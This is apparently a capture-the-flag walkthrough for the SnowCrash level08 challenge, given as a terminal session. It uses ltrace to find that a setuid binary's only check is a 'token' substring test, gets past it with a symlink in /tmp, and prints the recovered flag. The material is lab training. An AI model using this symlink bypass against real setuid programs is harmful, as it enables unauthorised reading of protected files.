Level08 instructions

```
level08@SnowCrash:~$ ll
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout*
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc*
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
-r-x------  1 level08 level08  675 Apr  3  2012 .profile*
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 df
level08: Unable to open df: No such file or directory
level08@SnowCrash:~$ cat token
cat: token: Permission denied
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ echo hamza > /tmp/hamza
level08@SnowCrash:~$ ./level08 /tmp/hamza
hamza
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$ ltrace ./level08
__libc_start_main(0x8048554, 1, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)                                                = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ ltrace ./level08 sfs
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("sfs", "token")                                                                    = NULL
open("sfs", 0, 014435162522)                                                              = -1
err(1, 0x80487b2, 0xbffff8e5, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open sfs: No such file or directory
 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ ltrace ./level08 /tmp/hamza
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/hamza", "token")                                                             = NULL
open("/tmp/hamza", 0, 014435162522)                                                       = 3
read(3, "hamza\n", 1024)                                                                  = 6
write(1, "hamza\n", 6hamza
)                                                                    = 6
+++ exited (status 6) +++
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ ln -sf $(pwd)/token /tmp/flag
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ ltrace ./level08 /tmp/flag
__libc_start_main(0x8048554, 2, 0xbffff7b4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/flag", "token")                                                              = NULL
open("/tmp/flag", 0, 014435162522)                                                        = -1
err(1, 0x80487b2, 0xbffff8df, 0xb7fe765d, 0xb7e3ebaflevel08: Unable to open /tmp/flag: Permission denied
 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$ cat /tmp/flag
cat: /tmp/flag: Permission denied
level08@SnowCrash:~$ ll /tmp/flag
lrwxrwxrwx 1 level08 level08 24 Feb  8 11:05 /tmp/flag -> /home/user/level08/token
level08@SnowCrash:~$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$
```